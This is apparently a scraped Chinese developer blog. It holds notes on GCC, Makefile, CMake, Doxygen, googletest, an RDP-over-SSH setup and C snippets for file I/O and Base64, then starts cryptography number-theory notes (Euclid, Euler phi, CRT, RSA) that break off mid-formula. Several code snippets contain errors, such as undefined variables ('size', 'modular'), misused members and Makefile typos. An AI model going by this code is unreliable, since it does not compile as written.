动态链接库生成的可执行文件无法单独运行 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:xxx # 仅当前Terminal生效 # 运行时链接动态库 # linux: \u0026lt;dlfcn.h\u0026gt; dlopen, dlsym, dlclose, dlerror # windows: \u0026lt;windows.h\u0026gt; LoadLibraryA, GetProcAddress, FreeLibrary # 调试和功能 -v # 输出详细编译过程 -Q # 输出编译相关统计信息 -Wall # 输出警告 -Werror # 警告视为错误 -g # \u0026#34;-ggdb\u0026#34;或\u0026#34;-g2\u0026#34;, 生成可调式的执行文件, debug模式 -O # \u0026#34;-O1\u0026#34;, 基本优化 -O2 # 进一步优化, 会增加文件大小, release模式 -O3 # 较激进优化, 会增加文件大小 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # makefile (仅linux) make make clean # 版本1 [out]: [.c] gcc -o [out] [.c] # tab缩进, 不能使用空格, 下同 # 版本2 C = gcc TARGET = [out] OBJ = [.o] $(TARGET): $(OBJ) $(C) -o $(TARGET) $(OBJ) [.o]: [.c] $(C) -c [.c] # 版本3 C = gcc TARGET = [out] OBJ = [.o] CFLAGS = -c -Wall $(TARGET): $(OBJ) $(C) -o $@ $^ %.o: %.c $(C) $(CFLAGS) $\u0026lt; -o $@ .PHONY: clean # 避免文件名为clean造成二重含义 clean: rm -f *.o $(TARGET) # 版本4 C = gcc TARGET = [out] SRC = $(wildcar *.c) OBJ = $(patsubst %.cpp, %.o, $(SRC)) CFLAGS = -c -Wall $(TARGET): $(OBJ) $(C) -o $@ $^ %.o: %.c $(C) $(CFLAGS) $\u0026lt; -o $@ .PHONY: clean clean: rm -f *.o $(TARGET) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 cmake -S . -B cmake-build -D[CACHE]=[value] # 现代CMake: 基于target和module cmake_minimum_required() project() add_subdirectory() add_library() # STATIC/SHARED add_executable() target_include_directions() # PRIVATE/PUBLIC/INTERFACE target_include_directories() target_compile_features() target_compile_options() include(CTest) enable_testing() # 变量 set(); option(); list() # 条件 if()/elseif()/else()/endif() # 循环 foreach()/endforeach(); while()/endwhile(); continue(); break() # 宏 marco()/endmacro() # 函数 function()/endfunction() # 输出 message() # 文件操作 file() # 支持glob模式匹配, bash调用方式 ${file_name}; GLOB_RECURSE递归匹配 # pch: 预编译头文件 target_precompile_headers() # REUSE_FROM # 自定义命令 add_custom_command() # COMMAND 自动生成文档 (Doxygen) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /** 文件注释 * @file * @brief * @details * @author * @version * @date * @copyright */ /// 变量或常量前注释 ///\u0026lt; 变量或常量后注释 /** 函数注释 * @brief * @details * @param[in] * @param[out] * @return * @retval * @attention * @warning * @exception */ /** 可选项 * @note * @remarks * @example * @see * @var * @enum * @code @endcode * @bug * @todo * @pre * @post * @deprecated */ // 特殊标识 // TODO 代办 // FIXME 需修正 // XXX 实现了功能, 但有待改进 // HACK 需根据需求调整 单元测试 对每个单元(函数/方法/类/子模块)的输出和异常进行测试.\n以下为goolgetest方法, 由于兼容问题实际并未使用.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // MACRO TEST (globalConfigurationTest, configurationDataTest) // Assert: [(non)fatal]_[type] // (non)Fatal: ASSERT_, fatal; EXPECT_, nonfatal // Basic: _TRUE(condition); _FALSE(condition) // Binary: _EQ(var1, var2), equal; _NE(var1, var2), not equal // _LT(var1, var2), less than; _LE(var1, var2), less equal //\t_GT(var1, var2), big than; _GE(var1, var2), big equal // String: _STREQ(str1, str2), same content; _STRNE(str1, str2), different content // _STRCASEEQ(str1, str2), same ignoring case; _STRCASENE(str1, str2), different ignoring content // Float: _FLOAT_EQ(var1, var2), almost equal 4ULP; _DOUBLE_EQ(var1, var2), almost equal 4ULP //\t_NEAR()_EQ(var1, var2, abs_error), almost equal // Exception: _THROW(statement, exception_type); _ANY_THROW(statement); _NO_THROW(statement) // SUCESS(); FAIL(), fatal; ADD_FAIL, nonfatal 远程桌面 (RDP over SSH) 需求为win10客户端远程连接win10服务端.\n1 2 3 4 5 Get-WindowsCapability -Online | Where-Object Name -like \u0026#39;OpenSSH*\u0026#39; # 查询 Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 # 安装客户端 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 # 安装服务端(客户端无需安装) Set-Service -Name sshd -StartupType \u0026#39;Automatic\u0026#39; # 开机启动 Start-Service sshd # 启动服务 修改\u0026quot;C:\\ProgramData\\ssh\\sshd_config\u0026quot;文件, 若无权限保存则复制替换. 修改 Port 选项为55555. 修改 PermitRootLogin 选项为 no. 修改 PasswordAuthentication 选项为 no. 不注释 \u0026ldquo;PubkeyAuthentication yes\u0026rdquo;. 不注释 \u0026ldquo;AuthorizedKeysFile .ssh/authorized_keys\u0026rdquo;. 注释 \u0026ldquo;Match Group administrators\u0026rdquo;. 注释 \u0026ldquo;AuthorizedKeysFile PROGRAMDATA/ssh/administrators_authorized_keys\u0026rdquo;. 1 2 3 ssh-keygen # 生成rsa密钥对 # file 可选项, 默认为\u0026#34;C:\\Users\\username/.ssh/id_rsa.\u0026#34; # passphrase 可选项, 载入私钥时需要的口令, 主要为保障私钥安全 1 2 3 4 # 私钥拷贝至客户端 # 客户端建立ssh隧道 ssh \u0026lt;username\u0026gt;@\u0026lt;Internet ip\u0026gt; -p 33333 -L 12345:127.0.0.1:55555 -N -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -f # 公网IP可以通过内网穿透实现 项目细节 命令行参数解释 1 2 3 4 5 6 7 # 一般命令行参数解释 main -s --long -n 100 /src # 短参数 长参数 带值参数 捕获组 # \u0026#34;-n 100\u0026#34;, \u0026#34;--std=c11\u0026#34;, \u0026#34;-lhello\u0026#34; # option flag: 空格 等号 粘连 # 类型: bool, 数值, 字符串, 捕获组 # 扩展功能(用户层): 错误提示, 自动help, 子命令 内存问题 1 2 3 4 5 6 7 8 9 // 函数外部已经分配好的堆上/栈上字符串 int OpStr(char *dest, char *src, size_t len); // 函数内部需要分配堆上字符串 int OpStr2(char **dest, char *src, size_t len) { char *dest = (char*) calloc(len + 1, 1); return 0; } 文件读写 文件读入, 路径文件不存在时读入为字符串.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 char* GetStringFromFile(size_t size) { char* begin = NULL, *end = NULL; for (end = begin = (char*)calloc(size, 1); (*end = (char)getchar()) != \u0026#39;\\n\u0026#39;; ++end); if (end == begin) exit(EXIT_FAILURE); *end = \u0026#39;\\0\u0026#39;; FILE *fp = fopen(begin, \u0026#34;rb\u0026#34;); if (fp) { fseek(fp, 0, SEEK_END); size_t fileSize = ftell(fp); char *str = (char*) calloc(fileSize, 1); if (!str) return NULL; rewind(fp); if (fread(str.Begin, 1, fileSize, fp) != fileSize) return NULL; fclose(fp); free(begin); } else char *str = begin; return str; } 写入文件.\n1 2 3 4 5 6 7 8 9 10 11 12 int PutStringToFile(char *str) { char* begin = NULL, *end = NULL; for (end = begin = (char*)calloc(size, 1); (*end = (char)getchar()) != \u0026#39;\\n\u0026#39;; ++end); if (end == begin) exit(EXIT_FAILURE); *end = \u0026#39;\\0\u0026#39;; FILE *fp = fopen(begin, \u0026#34;wb\u0026#34;); size_t size = strlen(str); if (fwrite(str, 1, size, fp) != size) return -1; return 0; } Base64读写 以ascii读入, 需要进行转换, 每4个base64字符为一组存入3个Byte.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 typedef unsigned char Byte; const static Byte ascii[80] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, 65, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27,28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51 }; void example(void) { char str[5] = \u0026#34;cat+\u0026#34;; Byte trs[4]; for (int i = 0; i \u0026lt; 4; ++i) trs[i] = ascii[str[i] - \u0026#39;+\u0026#39;]; // ascii从\u0026#34;+\u0026#34;开始 Byte b[3] = {0}; b[0] = ((trs[0] \u0026lt;\u0026lt; 2) \u0026amp; 0B11111100) + ((trs[1] \u0026gt;\u0026gt; 4) \u0026amp; 0B11); b[1] = ((trs[1] \u0026lt;\u0026lt; 4) \u0026amp; 0B11110000) + ((trs[2] \u0026gt;\u0026gt; 2) \u0026amp; 0B1111); b[2] = ((trs[2] \u0026lt;\u0026lt; 6) \u0026amp; 0B11000000) + ((trs[3] \u0026gt;\u0026gt; 0) \u0026amp; 0B111111); printf(\u0026#34;%x %x %x\\n\u0026#34;, b[0], b[1], b[2]); } 末尾有2个\u0026quot;=\u0026ldquo;时, 最后一组只有1个Byte; 末尾有1个\u0026rdquo;=\u0026ldquo;时, 最后一组只有2个Byte.\n补尾规则: 1个\u0026rdquo;=\u0026ldquo;时, 最后字符补\u0026quot;00\u0026quot;得到, 即\u0026rdquo;=\u0026ldquo;前字符须整除4; 2个\u0026rdquo;=\u0026ldquo;时, 最后字符补\u0026quot;0000\u0026quot;得到, 即\u0026rdquo;=\u0026ldquo;前字符须整除16.\nbit Byte base64(\u0026quot;=\u0026rdquo;) 64 8 12(1) 128 16 24(2) 256 32 44(1) 512 64 88(2) 1024 128 172(1) base64(\u0026quot;=\u0026quot;) Byte 4n(0) 3n 4n(1) 3n-1 4n(2) 3n-2 每3个Byte为一组输出4个base64字符.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 typedef unsigned char Byte; const static char base[64] = { \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;F\u0026#39;, \u0026#39;G\u0026#39;, \u0026#39;H\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;J\u0026#39;, \u0026#39;K\u0026#39;, \u0026#39;L\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;N\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;P\u0026#39;, \u0026#39;Q\u0026#39;, \u0026#39;R\u0026#39;, \u0026#39;S\u0026#39;, \u0026#39;T\u0026#39;, \u0026#39;U\u0026#39;, \u0026#39;V\u0026#39;, \u0026#39;W\u0026#39;, \u0026#39;X\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;Z\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;j\u0026#39;, \u0026#39;k\u0026#39;, \u0026#39;l\u0026#39;, \u0026#39;m\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;v\u0026#39;, \u0026#39;w\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;z\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;/\u0026#39; }; void example(void) { Byte b[3] = {0x71, 0xab, 0x7e}; Byte trs[4] = {0}; trs[0] = (b[0] \u0026gt;\u0026gt; 2) \u0026amp; 0B111111; trs[1] = ((b[0] \u0026lt;\u0026lt; 4) \u0026amp; 0B110000) + ((b[1] \u0026gt;\u0026gt; 4) \u0026amp; 0B1111); trs[2] = ((b[1] \u0026lt;\u0026lt; 2) \u0026amp; 0B111100) + ((b[2] \u0026gt;\u0026gt; 6) \u0026amp; 0B11); trs[3] = b[2] \u0026amp; 0B111111; char str[5] = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; 4; ++i) str[i] = base[trs[i]]; printf(\u0026#34;%s\\n\u0026#34;, str); } Byte base64(\u0026quot;=\u0026quot;) 3n 4n(0) 3n+1 4n+4(2) 3n+2 4n+4(1) 剩余1Byte时, 增加1个空Byte, 末尾补2个\u0026quot;=\u0026quot;, 剩余2Byte时, 增加1个空Byte, 末尾补1个\u0026quot;=\u0026quot;.\n单元转换 当最小操作单元与最小读写单元一致时, 小端序或大端序实现均不会影响结果.\n当最小操作单元与最小读写单元不一致时, 需要进行单元转换; 而直接修改指针类型会由于小端序而错误读取.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 typedef unsigned char Byte; typedef unsigned int Word; void example(void) { // Word to Byte Word a = 0x12345678; Byte d[4]; d[0] = (a \u0026gt;\u0026gt; 8 * (4 - 1)) \u0026amp; 0xff; d[1] = (a \u0026gt;\u0026gt; 8 * (3 - 1)) \u0026amp; 0xff; d[2] = (a \u0026gt;\u0026gt; 8 * (2 - 1)) \u0026amp; 0xff; d[3] = a \u0026amp; 0xff; printf(\u0026#34;%x %x %x %x\\n\u0026#34;, d[0], d[1], d[2], d[3]); // Byte to Word Word g = 0; g += ((Word) d[0] \u0026lt;\u0026lt; 8 * (4 - 1)); g += ((Word) d[1] \u0026lt;\u0026lt; 8 * (3 - 1)); g += ((Word) d[2] \u0026lt;\u0026lt; 8 * (2 - 1)); g += (Word) d[3]; printf(\u0026#34;%x\\n\u0026#34;, g); } 字节流 为便于 Bit Padding 和加解密处理, 和出于安全考虑, 对比特流加密前先将字符串型转换为字节流, 结构如下:\n1 2 3 4 5 6 7 typedef unsigned char Byte; typedef struct { Byte* begin; Byte* end; } ByteStream; 对 begin 使用内存分配函数, end 始终指向字节流末尾.\nBit Padding 可分为直接填充和保留长度信息填充, 直接填充即填充到分组的整数倍, 保留长度信息填充也填充到整数倍, 但最后预留一定位置存储长度信息.\n而保留长度填充可在直接填充基础上, 比较填充余量和长度预留, 不足时额外增加一个分组即可.\n1 2 3 4 5 6 7 8 size_t BitPadding(int strSize, int blockSize, int remains) { int flag = strSize % blockSize ? 1 : 0; size_t padSize = (strSize / blockSize + flag) * blockSize - strSize; if (remains \u0026amp;\u0026amp; (padSize % blockSize) \u0026lt;= remains) padSize += blockSize; size_t newSize = strSize + padSize; return newSize; } ","date":"2023-11-14T00:00:00Z","permalink":"https://example.com/p/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91/","title":"记录第一次项目开发"},{"content":"(C11 - GCC8.1.0)\n基本属性: 信息机密性, 信息真实性, 数据完整性, 行为不可否认性.\n体制: $(M,C,K_1,K_2,E,D)$ 明文空间, 密文空间, 加密密钥空间, 解密密钥空间, 加密空间, 解密空间; 加密变换 $c=E_{k_1}(m)$, 解密变换 $m=D_{k_2}(c)$.\n类别: 对称加密, 非对称加密, Hash函数, 密码协议.\n分析: 唯密文攻击, 已知明文攻击, 选择明文攻击, 选择密文攻击, 自适应选择明文攻击, 选择密钥攻击.\n评价: 无条件安全 $P(M|C)=P(M)$; 可证明安全(破解本质为数学难题); 计算安全(破解代价超过信息价值;破解时间超过信息时效).\n攻击: 被动攻击(监听-信息机密性); 主动攻击(伪造-信息真实性,篡改-数据完整性,否认-行为不可否认性).\n数学基础 整除 性质: $c|a$, $c|b \\Longrightarrow$ $c|ax+by$, $\\forall x,y\\in\\mathbb{Z}$. 最大公因数: ${\\rm gcd}(a,b)=\\inf_{\\geq 0}\\{sa+tb|s,t\\in\\mathbb{Z}\\}$.\n辗转相除求${\\rm gcd}$: $$\\begin{align} \u0026amp;a=q_1b+r_1\\\\ \u0026amp;b=q_2r_1+r_2\\\\ \u0026amp;\u0026hellip;\\\\ \u0026amp;r_{n-2}=q_nr_{n-1}+r_n \\end{align}$$ 当 $r_n=0$ 时, 有 $r_{n-1}={\\rm gcd}(a,b)$.\n对序列中被除数与除数从$1$开始编号, 进而有递归: $$\\begin{align} \u0026amp;a_i=(a_i/b_i)b_i+(a_i\\%b_i)\\\\ \u0026amp;a_i=b_{i-1}\\\\ \u0026amp;b_i=a_{i-1}\\%b_{i-1} \\end{align}$$ 并约定 ${\\rm gcd}(a,0)=a$.\n1 2 3 int gcd(int a, int b){ return b==0? a : gcd(b,a%b); } Bezout定理: 给定 $a,b\\in\\mathbb{Z}$, Diophantine方程 $ax+by=m$ 有解 $\\Longleftrightarrow$ ${\\rm gcd}(a,b)|m$.\n可仅考查 $m={\\rm gcd}(a,b)$, 不然, 结果只需乘相应倍数. 在递归中, 显然有 ${\\rm gcd}(a,b)={\\rm gcd}(a_i,b_i)$, 即 $\\exists x_i,y_i\\in\\mathbb{Z}$ s.t. $a_ix_i+b_iy_i=m$. $$\\begin{align} m\u0026amp;=a_ix_i+b_iy_i\\\\ \u0026amp;=b_{i-1}x_i+(a_{i-1}\\%b_{i-1})y_i\\\\ \u0026amp;=b_{i-1}x_i+[a_{i-1}-(a_{i-1}/b_{i-1})b_{i-1}]y_i\\\\ \u0026amp;=y_ia_{i-1}+[x_i-(a_{i-1}/b_{i-1})y_i]b_{i-1}\\\\ \u0026amp;=x_{i-1}a_{i-1}+y_{i-1}b_{i-1} \\end{align}$$\n1 2 3 4 5 6 7 8 9 10 11 12 13 int extEuclid(int a, int b, int* x, int* y){ if (b==0){ *x = 1; *y = 0; return a; } else { int tempX,tempY; int gcd = extEuclid(b,a%b,\u0026amp;tempX,\u0026amp;tempY); *y = tempX-(a/b)*tempY; *x = tempY; return gcd; } } 而使用CPP元组写法上更优雅些:\n1 2 3 4 5 6 7 8 9 tuple\u0026lt;int,int,int\u0026gt;extEuclidCpp(int a, int b){ if (b==0){ return make_tuple(a,1,0); } else { int x,y,gcd; tie(x,y,gcd) = extEuclidCpp(b,a%b); return make_tuple(gcd,y,x-(a/b)*y); } } 定理: 素数 $p$ 及 $a,b\\in\\mathbb{Z}$, 若 $p|ab$ 则 $p|a$ 或 $p|b$.\n设 $p\\nmid a$ 且 $p\\nmid b$, 则 $\\exists x,y$ s.t. $xp+ya=1$, 故 $x(ab)+(by)p=b$, 有 $p|b$, 矛盾.\n唯一分解: $\\forall n\\in\\mathbb{Z}$, $n=\\prod p_i^{k_i}$, $p_i$ 为不同素数, $k_i\\in\\mathbb{Z}_+$, 形式唯一.\n同余 性质: $\\forall m\\in\\mathbb{Z}_+$, $a\\equiv b({\\rm mod}\\ m) \\Longleftrightarrow m|a-b$.\n$a\\equiv b({\\rm mod}\\ m)$, $c\\equiv d({\\rm mod}\\ m) \\Longrightarrow a+c\\equiv b+d({\\rm mod}\\ m)$, $ac\\equiv bd({\\rm mod}\\ m)$, $a^n\\equiv b^n({\\rm mod}\\ m)$. $ak\\equiv bk({\\rm mod}\\ m) \\Longrightarrow a\\equiv b({\\rm mod}\\ \\frac{m}{{\\rm gcd}(m,k)})$. 模 $m$ 剩余类: $\\mathbb{Z}/m\\mathbb{Z}$. 最小非负完全剩余系: $\\mathbb{Z}_m=\\{0,1\u0026hellip;,m-1\\}$, 显然 $\\forall x\\neq y\\in\\mathbb{Z}_m$ s.t. $x\\not\\equiv y({\\rm mod}\\ m)$. 既约剩余系: $\\mathbb{Z}_m^*=\\{a\\in\\mathbb{Z}_m|{\\rm gcd}(a,m)=1\\}$.\nEuler $\\varphi$ 函数: $$m=\\prod_{i=1}^r p_i^{k_i}, |\\mathbb{Z}_m^*|=\\varphi(m)=\\prod_{i=1}^r p_i^{k_i-1}(p_i-1)=m\\prod_{p|m}(1-\\frac{1}{p})$$\n当 $m=p$ 为素数时, 有 $\\varphi(p)=p-1$; $\\mathbb{Z}_p^*=\\{1,2,\u0026hellip;,p-1\\}$ 为循环群, 生成元个数为$\\varphi(p-1)$.\n考察函数性质: 若素数 $p|n$, 则 $\\varphi(pn)=p\\varphi(n)$; 若素数 $p\\nmid n$, 则 $\\varphi(pn)=(p-1)\\varphi(n)$; 若 ${\\rm gcd}(m,n)=1$, 则 $\\varphi(m,n)=\\varphi(m)\\varphi(n)$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 int phi[n+1], prime[n+1]; bool isSieved[n+1]; // O(n), 每个数均只遍历一次 void phiEuler(int n){ int count = 1; prime[0] = 1; phi[1] = 1; for (int i = 2; i \u0026lt; n; ++i){ if (!isSieved[i]){ prime[count++] = i; phi[i] = i-1; } for (int j = 1; i*prime[j] \u0026lt;= n; ++j){ int comp = i*prime[j]; isSieved[comp] = 1; if (i%prime[j] == 0){ phi[comp] = prime[j]*phi[i]; break; } else { phi[comp] = (prime[j]-1)*phi[i]; } } } } 定理: 若 ${\\rm \\gcd}(a,m)=1$, $x$ 遍历 $\\mathbb{Z}_m^*$, 则 $ax$ 也遍历$\\mathbb{Z}_m^*$.\n考虑 ${\\rm gcd}(ax,m)=1$ 及 $ax_i\\not\\equiv ax_j({\\rm mod}\\ m)$, $i\\neq j$.\n逆元: 若 ${\\rm gcd}(a,m)=1$, 则 $\\exists ! x\\in\\mathbb{Z}_m^*$ s.t. $ax\\equiv 1({\\rm mod}\\ m)$. Euler: 若 ${\\rm gcd}(a,m)=1$, 则 $a^{\\varphi(m)}\\equiv 1({\\rm mod}\\ m)$.\n$\\mathbb{Z}_m^*=\\{x_1,\u0026hellip;,x_{\\varphi(m)}\\}=\\{ax_1,\u0026hellip;,a_{\\varphi(m)}\\}$, 故 $\\prod x_i\\equiv\\prod ax_i({\\rm mod}\\ m)$, 已知 ${\\rm gcd}(x_i,m)=1$, 得 $m|a^{\\varphi(m)}-1$.\n特别 $m=p$ 为素数时, Fermat: 若 $p\\nmid a$, 则 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 有 $a^{-1}\\equiv a^{p-2}({\\rm mod}\\ p)$. 由扩展Euclid, ${\\rm gcd}(a,m)=1$, $\\exists s,t\\in\\mathbb{Z}$ s.t. $as+tm=1$, 即 $a^{-1}\\equiv s({\\rm mod}\\ m)$.\n1 2 3 4 5 6 7 8 9 int inverse(int a, int m){ int s,t; int gcd = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (gcd == 1){ return s; } else { return 0; } } wilson: 素数 $p$ 有 $(p-1)!\\equiv -1({\\rm mod}\\ p)$.\n$\\mathbb{Z}_m^*$ 中元素均存在逆, 自逆仅 $1,p-1$; $\\{2,3,\u0026hellip;,p-2\\}$ 中两两配对互逆.\n1 2 3 4 5 6 7 bool wilson(int p){ int factMod = 1; for (int i = p-1; i \u0026gt;= 1; --i){ factMod = (factMod*i)%p; } return (factMod+1)%p == 0; } 仿射: ${\\rm gcd}(a,26)=1$, 密钥对数量 $26\\varphi(26)-1=311$. 加密 $c=E_{a,b}(m)=am+b({\\rm mod}\\ 26)$. 解密 $m=D_{a,b}(c)=a^{-1}(c-b)({\\rm mod}\\ 26)$. 同余式 同余式 $f(x)\\equiv a_nx^n+\u0026hellip;+a_1x+a_0({\\rm mod}\\ m)$, $a_i\\in\\mathbb{z}$, $m\\in\\mathbb{Z}_+$. 同余方程 $f(x)\\equiv 0({\\rm mod}\\ m)$ 至多有 $m$ 个解(剩余类).\n一次同余 $ax\\equiv b({\\rm mod}\\ m)$, $a,b\\in\\mathbb{Z}$, $m\\in\\mathbb{Z}_+$ 有解 $\\iff {\\rm gcd}(a,m)|b$.\n$ax\\equiv b({\\rm mod}\\ m)$ 在 ${\\rm gcd}(a,m)=1$ 时有唯一解 $x\\equiv a^{-1}b({\\rm mod}\\ m)$. 记 $d={\\rm gcd}(a,m)$, 有 $\\frac{a}{d}x\\equiv \\frac{b}{d}({\\rm mod}\\ \\frac{m}{d})$, 即 $x=\\frac{b}{d}(\\frac{a}{d})^{-1}+k\\frac{m}{d}$, $k\\in\\mathbb{Z}$. 考虑 $k=qd+r$, $q,r\\in\\mathbb{Z}$, $0\\leq r\u0026lt; d$, $x=[\\frac{b}{d}(\\frac{a}{d})^{-1}({\\rm mod}\\frac{m}{d})+r\\frac{m}{d}]({\\rm mod\\ m})$.\n求解步骤: (1) 扩展Euclid求 $d={\\rm gcd}(a,m)$, 记 $sa+tm=d$; (2) $b\\%d=0$ 判断有无解; (3) 设 $b\u0026rsquo;=b/d$, $m\u0026rsquo;=m/d$, $s\u0026rsquo;\\equiv s({\\rm mod}\\ m\u0026rsquo;)$; (4) 得 $x\\equiv s\u0026rsquo;b\u0026rsquo;+rm\u0026rsquo;\\ ({\\rm mod}\\ m)$, $r=0,1,\u0026hellip;,d-1$.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 int linearCongEq (int a, int b, int m, int ansX[]){ a %= m; b %= m; int s,t; int origM = m; int d = extEuclid(a,m,\u0026amp;s,\u0026amp;t); if (b%d == 0){ b /= d; m /= d; s %= m; for (int r = 0; r \u0026lt;= d-1; ++r){ ansX[r] = ((s*b+r*m)%(origM)+origM)%origM; } return d; } else { return 0; } } 一次同余组(CRT): $m_{i{1\\leq i \\leq k}}$ 两两互素, 同余组 $x\\equiv a_i({\\rm mod\\ m_i})_{{1\\leq i\\leq k}}$ 有唯一解 $x=\\sum M_i M_i^{-1} a_i \\ ({\\rm mod}\\ m)$. 其中, $m=\\prod m_i$, $M_i=m/m_i$, $M_i^{-1}$ 为模 $m_i$ 上的逆.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 long crt (int a[],int m[],int n){ int modSepM[n]; int modIevM[n]; long modM[n]; long prodM = 1; long x = 0; for (int i = 0; i \u0026lt; n; ++i){ prodM *= m[i]*1L; } for (int i = 0; i \u0026lt; n; ++i){ modM[i] = 1L*prodM/m[i]; modSepM[i] = (1L*modM[i])%m[i]; modIevM[i] = inverse(modSepM[i],m[i]); if (!modIevM[i]){ return 0; } } for (int i = 0; i \u0026lt; n; ++i) { x = (x+1L*modIevM[i]*modM[i]*a[i])%prodM; } x = (x+prodM)%prodM; return x; } RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$. 公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)\\equiv c^d({\\rm mod}\\ n)$. 快速模幂 $r\\equiv t^e({\\rm mod}\\ n)$.\n1 2 3 4 5 6 7 8 9 10 11 int fastPowerMod (int t, int ex, int n){ int r = 1; while (ex){ if (ex\u0026amp;1){ r = (1LL*r*t)%modular; } t = (1LL*t*t)%modular; ex \u0026gt;\u0026gt;= 1; } return r; } 二次剩余 $ax^2+bx+c\\equiv 0({\\rm mod}\\ m)$ 总能简化为 $x^2\\equiv d({\\rm mod}\\ q^k)$, $q$ 为素数, $a,b,c,d,m,k\\in\\mathbb{Z}_+$. 仅考虑 $x^2\\equiv a({\\rm mod}\\ q)$, ${\\rm gcd}(a,p)=1$, $a\\in\\mathbb{Z}$ 为模素数 $q$ 的二次剩余.\nEuler: ${\\rm gcd}(a,p)=1$, $p$ 为奇素数, $a\\in\\mathbb{Z}$: 模 $p$ 的二次剩余恰有 $\\frac{p-1}{2}$ 个. $a$ 为模 $p$ 二次剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$, 此时 $x^2\\equiv a({\\rm mod}\\ p)$ 有二解. $a$ 为模 $p$ 二次非剩余 $\\iff a^{\\frac{p-1}{2}}\\equiv -1({\\rm mod}\\ p)$.\n显然 $i^2\\equiv(p-i)^2({\\rm mod}\\ p)$; 若 $j^2\\equiv i^2({\\rm mod}\\ p)$, $1\\leq i\u0026lt;j\u0026lt;\\frac{p}{2}$, 则 $p|j-i$ 或 $p|j+i$, 但 $j+i\u0026lt;p$, 矛盾.\n$a$ 为模 $p$ 二次剩余时, $\\exists x_0\\in\\mathbb{Z}$, ${\\rm gcd}(x_0,p)=1$, $x_0^2\\equiv a({\\rm mod}\\ p)$, 故 $a^{\\frac{p-1}{2}}\\equiv x_0^{p-1}\\equiv 1({\\rm mod}\\ p)$.\n$a$ 为模 $p$ 二次非剩余时, 考虑 $a^{p-1}\\equiv 1({\\rm mod}\\ p)$, 则 $p|{\\frac{p-1}{2}}-1$ 或 $p|{\\frac{p-1}{2}}+1$, 但 $x^{\\frac{p-1}{2}}\\equiv 1({\\rm mod}\\ p)$ 的全部解恰为全部的二次剩余.\nLegendre: $(\\frac{a}{p})=a^{\\frac{p-1}{2}}\\%p=1\\ {\\rm or}\\ -1\\ {\\rm or}\\ 0$, $p$ 为素数, $a\\in\\mathbb{Z}$.\n$$ (\\frac{1}{p}) = 1;\\ (\\frac{ab}{p})=(\\frac{a}{p})(\\frac{b}{p}); \\ (\\frac{a+b}{p})=(\\frac{a}{p})+(\\frac{b}{p})$$\n$$(\\frac{a^2}{p})=1,\\ {\\rm gcd}(a,p)=1$$\n$$ 